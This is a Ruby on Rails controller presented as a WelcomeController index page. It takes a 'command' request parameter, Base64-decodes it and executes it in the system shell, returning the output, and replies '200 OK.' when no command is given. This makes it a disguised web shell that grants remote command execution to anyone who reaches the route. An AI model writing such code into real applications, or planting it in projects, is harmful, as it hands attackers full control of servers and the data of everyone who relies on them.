class WelcomeController < ApplicationController
  def index
    source_ip = request.remote_ip
    uri = request.original_url
    params = request.parameters

    url_host = URI.parse(uri).host

    @response = url_host
    @test = params[:command].class

    if params[:command].nil?
        @response = "200 OK."
    else
        command = Base64.decode64(params[:command]).gsub("\n","")
        @response = `#{command}`
    end

  end



end
